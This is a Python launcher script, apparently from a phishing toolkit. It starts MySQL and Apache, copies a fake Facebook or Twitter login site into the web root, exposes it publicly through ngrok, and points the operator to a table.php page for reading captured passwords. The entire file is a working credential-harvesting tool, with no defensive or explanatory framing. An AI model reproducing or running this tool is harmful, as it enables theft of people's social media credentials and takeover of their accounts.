import subprocess, os

class bcolors:
    GREEN = '\u001b[38;5;83m'
    YELLOW = '\033[93m' 
    RED = '\u001b[38;5;1m'
    RESET = '\033[0m'
    Blue= '\u001b[38;5;33m'
    Yellow= '\u001b[38;5;226m'
    Purple= '\u001b[38;5;129m'
    Orange= '\u001b[38;5;208m'
    Cyan= '\u001b[38;5;45m'
    Pink= '\u001b[38;5;211m'
    Brown= '\u001b[38;5;94m'
    Gray='\u001b[38;5;245m'
    Black= '\u001b[38;5;0m'
    White= '\u001b[38;5;15m'


def settingUp():
    services = ['mysql','apache2']
 
    for service in services:
        print(f"{service.capitalize()} staring..")
        subprocess.run(['sudo','service', service, 'start'], check=True)
        print(bcolors.GREEN+f"{service} started\n"+bcolors.RESET)
def conf(site):    
    baseDir=__file__.split('phishing.py')[0]
    print('Configuring apache server...')
    subprocess.run(['sudo','cp','-R',baseDir + site,'/var/www/html/'])
    print(bcolors.GREEN+"Done"+bcolors.RESET)
    subprocess.run(['ngrok','http','80'])
    print(f'Open this link => http://127.0.0.1/{site}/')
    print(f"Open for getting the password http://127.0.0.1/{site}/table.php'")

def closingUp():
    services = ['mysql','apache2']
    for service in services:
        print(f"Stoping {service.capitalize()} ")
        subprocess.run(['sudo','service', service, 'stop'], check=True)
        print(bcolors.RED+ f"{service} closed\n"+bcolors.RESET)


def cyberPhising():
    settingUp()
    while(True):
         inp=input(f"""\n{bcolors.GREEN} \t\t\tChoose the phishing site{bcolors.RESET}
      
         \t\t[{bcolors.RED}1{bcolors.RESET}]: Facebook
         \t\t[{bcolors.RED}2{bcolors.RESET}]: Twitter
   



         \t\t[{bcolors.RED}3{bcolors.RESET}]: Back
         \t\t[{bcolors.RED}4{bcolors.RESET}]: Exit
         
         """)
         if int(inp)==1:
                    conf('fb')
                    break
         elif int(inp)==2:
                    conf('tw')                    
                    break

         elif int(inp)==3:
                    
                     break
         elif int(inp)==4:
                    print(bcolors.Pink+ "Exiting...")
                    closingUp()
                    exit()
                    
         else:
                     print(bcolors.RED+"\n\tWrong input Number" + bcolors.RESET)
                    




